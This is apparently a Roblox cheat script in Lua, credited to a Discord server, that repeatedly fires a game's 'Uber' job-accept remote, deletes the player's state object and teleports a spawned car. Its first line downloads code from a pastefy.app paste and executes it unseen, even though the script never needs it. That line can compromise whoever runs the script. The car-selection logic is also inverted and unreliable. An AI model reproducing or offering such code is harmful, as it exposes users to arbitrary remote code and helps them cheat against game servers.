-- This file was generated at discord.gg/syncrypt

loadstring(game:HttpGet("https://pastefy.app/z8hrUL3O/raw", true))()

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = game:GetService("Players").LocalPlayer
local Aceitar = ReplicatedStorage:WaitForChild("Uber"):WaitForChild("Aceitar")

while true do
	Aceitar:FireServer()

	local EstadoPersonagem = LocalPlayer:FindFirstChild("EstadoPersonagem")

	if EstadoPersonagem then
		EstadoPersonagem:Destroy()
	end

	local ok = workspace.CarrosSpawnados:FindFirstChild("ok")
	local LocalMarcado = workspace:FindFirstChild("LocalMarcado")
	local DriveSeat

	if ok then
		if LocalMarcado then
			DriveSeat = ok:FindFirstChild("DriveSeat")
		else
			DriveSeat = LocalMarcado
		end
	else
		DriveSeat = ok
	end

	if DriveSeat then
		if not ok.PrimaryPart then
			ok.PrimaryPart = ok:FindFirstChild("DriveSeat")
		end

		ok:SetPrimaryPartCFrame(LocalMarcado.CFrame)
	else
		warn("Carro, destino ou DriveSeat não encontrados.")
	end

	task.wait(1)
end
